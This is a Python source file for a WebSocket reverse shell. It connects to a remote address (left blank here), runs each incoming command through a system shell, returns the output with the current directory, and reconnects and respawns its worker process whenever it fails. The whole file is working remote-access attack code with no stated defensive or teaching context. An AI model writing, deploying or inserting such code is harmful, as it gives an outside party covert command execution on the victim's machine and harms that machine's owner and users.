import os
import time
import socket
import websocket
import subprocess
from multiprocessing import Process

address = ""

def on_message(ws, cmd):
    """Receive system commands and execute them."""
    if cmd.startswith("cd "):
        os.chdir(cmd[3:])
        x1 = f'{os.getcwd()}>'
        ws.send(x1.encode())
    if len(cmd) == 2 and ":" in cmd:
        os.chdir(cmd)
        x2 = f'{os.getcwd()}>'
        ws.send(x2.encode())

    if len(cmd) > 0:
        p = subprocess.run(cmd, shell=True, capture_output=True)
        data = p.stdout + p.stderr
        x3 = f'{os.getcwd()}>'
        ws.send(data + x3.encode())

def on_open(ws):
    print("WebSocket connection established")
    ws.send(f'{os.getcwd()}>')

def on_close(ws):
    print("Connection Closed")

def on_error(ws, error):
    print(error)

def connect():
    """Establish a connection to the address, then call receiver()"""
    while True:
        try:
            ws = websocket.WebSocketApp(address, on_open=on_open, on_message=on_message, on_close=on_close, on_error=on_error)
            ws.run_forever()
        except Exception as e:
            print("Connection Error: " + str(e))
            time.sleep(2)
            continue

if __name__ == "__main__":
    while True:
        try:
            print("Creating new worker...")
            p = Process(target=connect)
            p.start()
            p.join()
            print("Worker terminated\n")
        except:
            ...